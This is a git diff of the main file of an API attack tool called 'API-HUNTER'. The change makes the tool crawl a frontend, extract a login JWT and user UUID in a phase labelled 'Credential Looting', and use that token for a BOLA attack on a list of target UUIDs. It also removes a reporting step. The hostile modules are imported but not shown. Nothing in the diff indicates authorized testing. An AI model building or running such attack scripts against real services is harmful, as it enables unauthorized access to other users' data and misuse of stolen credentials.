@@ -1,27 +1,30 @@
 # scanner/scanner.py
-
-# 1. Import configurations
-from config import FRONTEND_URL, BACKEND_DOMAIN, TARGET_UUIDS, VULNERABLE_API_BASE, ATTACKER_TOKEN
-
-# 2. Import modules
+from config import FRONTEND_URL, VULNERABLE_API_BASE, TARGET_UUIDS
 from modules.crawler import discover_endpoints
 from modules.bola_engine import run_bola_attack
-# from modules.reporter import send_to_supabase
 
 def main():
     print("=== API-HUNTER INITIALIZED ===")
     
-    # Phase 1: Reconnaissance
-    print("\n[PHASE 1] Crawling Frontend for Endpoints...")
-    endpoints = discover_endpoints(FRONTEND_URL, BACKEND_DOMAIN)
+    # Phase 1: Credential Looting
+    print("\n[PHASE 1] Crawling Frontend & Looting Credentials...")
     
+    endpoints, looted_data = discover_endpoints(FRONTEND_URL)
+    
+    attacker_token = looted_data.get("token")
+    attacker_uuid = looted_data.get("uuid")
+
+    if not attacker_token:
+        print("\n[X] ERROR: Failed to extract JWT token during login. Aborting.")
+        return
+
+    dynamic_target_uuids = TARGET_UUIDS.copy()
+    if attacker_uuid and attacker_uuid not in dynamic_target_uuids:
+        dynamic_target_uuids.insert(0, attacker_uuid)
+
     # Phase 2: Active Scanning (BOLA)
-    print("\n[PHASE 2] Executing BOLA Attack on discovered parameters...")
-    attack_results = run_bola_attack(TARGET_UUIDS, VULNERABLE_API_BASE, ATTACKER_TOKEN)
-    
-    # Phase 3: Reporting
-    # print("\n[PHASE 3] Logging to Supabase...")
-    # send_to_supabase(attack_results)
+    print("\n[PHASE 2] Executing BOLA Attack with Looted Token...")
+    attack_results = run_bola_attack(dynamic_target_uuids, VULNERABLE_API_BASE, attacker_token)
 
     print("\n=== SCAN COMPLETE ===")
 
